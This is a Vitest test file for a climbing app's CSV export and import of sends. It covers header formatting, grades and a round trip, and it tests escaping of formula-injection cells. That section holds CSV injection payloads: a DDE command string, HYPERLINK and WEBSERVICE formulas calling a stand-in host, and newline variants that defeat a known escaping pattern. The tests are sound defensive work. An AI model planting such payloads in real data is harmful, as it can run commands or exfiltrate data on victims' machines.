import { describe, expect, it } from "vitest";

import type { UserSendRow } from "@/db/queries";

import { parseGrade } from "./grades";
import { buildSendsExportCsv } from "./sends-export";
import {
  distinctValues,
  guessAscentStyleMapping,
  guessClimbTypeMapping,
  guessColumnMapping,
  guessGradeFeelMapping,
  guessRatingMapping,
  normalizeImportRows,
  parseCsvText,
} from "./sends-import";

function row(overrides: Partial<UserSendRow> = {}): UserSendRow {
  return {
    id: 1,
    climbId: 1,
    climbName: "Test Highball",
    climbType: "boulder",
    climbGrade: 5,
    areaId: 1,
    areaName: "Test Highball Alcove",
    ascentStyle: "redpoint",
    dateSent: "2026-01-01",
    rating: 4,
    suggestedGrade: null,
    gradeFeel: "solid",
    comment: null,
    ...overrides,
  };
}

describe("buildSendsExportCsv", () => {
  it("outputs the expected header row", () => {
    const csvText = buildSendsExportCsv([]);
    const [header] = csvText.trim().split("\n");
    expect(header).toBe(
      [
        "Date Sent",
        "Ascent Style",
        "Climb Name",
        "Area Name",
        "Climb Type",
        "Grade",
        "Suggested Grade",
        "Grade Feel",
        "Rating",
        "Comment",
      ].join(","),
    );
  });

  it("capitalizes ascent style and climb type, and formats the grade", () => {
    const csvText = buildSendsExportCsv([
      row({ ascentStyle: "flash", climbType: "boulder", climbGrade: 5 }),
    ]);
    expect(csvText).toContain("Flash");
    expect(csvText).toContain("Boulder");
    expect(csvText).toContain("V4");
  });

  it("renders an unknown grade using formatGrade's own fallback", () => {
    const csvText = buildSendsExportCsv([row({ climbGrade: null })]);
    expect(csvText).toContain("—");
  });

  it("renders a null suggested grade, rating, and comment as blank", () => {
    const csvText = buildSendsExportCsv([
      row({ suggestedGrade: null, rating: null, comment: null }),
    ]);
    const [, dataLine] = csvText.trim().split("\n");
    expect(dataLine.endsWith(",Solid,,")).toBe(true);
  });

  it("formats a non-null suggested grade through formatGrade", () => {
    const csvText = buildSendsExportCsv([row({ climbType: "boulder", suggestedGrade: 6 })]);
    expect(csvText).toContain("V5");
  });

  it("capitalizes the grade feel", () => {
    for (const [gradeFeel, expected] of [
      ["low", "Low"],
      ["solid", "Solid"],
      ["high", "High"],
    ] as const) {
      const csvText = buildSendsExportCsv([row({ gradeFeel })]);
      expect(csvText).toContain(expected);
    }
  });
});

describe("export → import round trip", () => {
  it("re-imports a betabook export with identical send fields", () => {
    const exported = buildSendsExportCsv([
      row({
        climbName: "The Mandala",
        climbType: "boulder",
        climbGrade: 13, // V12 posted
        suggestedGrade: 14, // user suggested V13
        gradeFeel: "high",
        ascentStyle: "flash",
        dateSent: "2026-01-01",
        rating: 4,
        comment: "Great, fun climb",
      }),
      row({
        climbName: "No Opinion",
        climbType: "sport",
        climbGrade: 16, // 5.11c posted
        suggestedGrade: null, // no suggestion recorded on the send
        gradeFeel: "solid",
        ascentStyle: "onsight",
        dateSent: null,
        rating: null,
        comment: null,
      }),
    ]);

    // Parse and auto-map exactly the way the wizard does.
    const parsed = parseCsvText(exported);
    expect(parsed.warnings).toEqual([]);
    const mapping = guessColumnMapping(parsed.headers);
    const ascentStyleMapping = guessAscentStyleMapping(
      distinctValues(parsed.rows, mapping.ascentStyle),
    );
    const climbTypeMapping = guessClimbTypeMapping(distinctValues(parsed.rows, mapping.climbType));
    const gradeFeelMapping = guessGradeFeelMapping(distinctValues(parsed.rows, mapping.gradeFeel));

    const { valid, invalid, warnings } = normalizeImportRows(
      parsed,
      mapping,
      ascentStyleMapping,
      climbTypeMapping,
      gradeFeelMapping,
      guessRatingMapping(distinctValues(parsed.rows, mapping.rating), "betabook"),
      "iso",
      { today: "2026-08-19" },
    );
    expect(invalid).toEqual([]);
    expect(warnings).toEqual([]);
    expect(valid).toHaveLength(2);

    const [withSuggestion, withoutSuggestion] = valid;
    expect(withSuggestion.climbName).toBe("The Mandala");
    expect(withSuggestion.ascentStyle).toBe("flash");
    expect(withSuggestion.dateSent).toBe("2026-01-01");
    expect(withSuggestion.rating).toBe(4);
    expect(withSuggestion.comment).toBe("Great, fun climb");
    expect(withSuggestion.gradeFeel).toBe("high");
    expect(withSuggestion.climbTypeHint).toBe("boulder");
    // The Suggested Grade column (not the posted Grade column) round-trips
    // to the same ordinal importSends will store.
    expect(withSuggestion.blankGradeMeans).toBe("no-suggestion");
    expect(withSuggestion.gradeText).not.toBeNull();
    expect(parseGrade("boulder", withSuggestion.gradeText!, "native")).toBe(14);

    // A send exported without a suggested grade stays that way: blank cell +
    // "no-suggestion" makes importSends store null instead of falling back
    // to the climb's posted grade.
    expect(withoutSuggestion.gradeText).toBeNull();
    expect(withoutSuggestion.blankGradeMeans).toBe("no-suggestion");
    expect(withoutSuggestion.ascentStyle).toBe("onsight");
    expect(withoutSuggestion.dateSent).toBeNull();
    expect(withoutSuggestion.rating).toBeNull();
    expect(withoutSuggestion.comment).toBeNull();
    expect(withoutSuggestion.gradeFeel).toBe("solid");
  });
});

// Climb and area names come from the shared catalog, which any signed-in user
// can rename, so these cells carry text the exporting user never wrote. A
// leading =, +, -, or @ makes a spreadsheet treat the cell as a formula.
describe("buildSendsExportCsv formula escaping", () => {
  const cellsOf = (csvText: string) => csvText.trim().split("\n")[1];
  // What the payload should look like once escaped: prefixed with an
  // apostrophe, then quoted as a CSV field (which doubles any quote in it).
  const neutralized = (payload: string) => `"'${payload.replaceAll('"', '""')}"`;

  it.each([
    ["=cmd|'/c calc'!A1", "climbName"],
    ['=HYPERLINK("https://evil.tld","click")', "climbName"],
    ["+1+1", "areaName"],
    ["-2+3", "areaName"],
    ["@SUM(A1:A9)", "climbName"],
  ])("escapes %s in %s", (payload, field) => {
    const cells = cellsOf(buildSendsExportCsv([row({ [field]: payload })]));
    expect(cells).toContain(neutralized(payload));
    expect(cells).not.toContain(`,${payload}`);
  });

  it("escapes a payload a user stored in their own comment", () => {
    const payload = '=WEBSERVICE("https://evil.tld")';
    expect(cellsOf(buildSendsExportCsv([row({ comment: payload })]))).toContain(
      neutralized(payload),
    );
  });

  // papaparse's own `escapeFormulae: true` pattern ends in `.*$`, and `.`
  // does not match LF — so one newline in the cell made the whole pattern
  // miss and shipped the payload unescaped. Climb and area names keep
  // interior newlines, so this was a live bypass, not a curiosity.
  it.each([
    ["=1\n+2", "climbName"],
    ['=HYPERLINK("https://evil.tld","x")\n', "areaName"],
    ['=WEBSERVICE("https://evil.tld")\r\n=1+1', "climbName"],
  ])("escapes %j in %s despite an embedded newline", (payload, field) => {
    // Not cellsOf: the payload's own newline would split the row.
    expect(buildSendsExportCsv([row({ [field]: payload })])).toContain(neutralized(payload));
  });

  it("leaves an ordinary name untouched", () => {
    expect(cellsOf(buildSendsExportCsv([row({ climbName: "Midnight Lightning" })]))).toContain(
      "Midnight Lightning",
    );
    expect(cellsOf(buildSendsExportCsv([row({ climbName: "Midnight Lightning" })]))).not.toContain(
      "'Midnight",
    );
  });
});
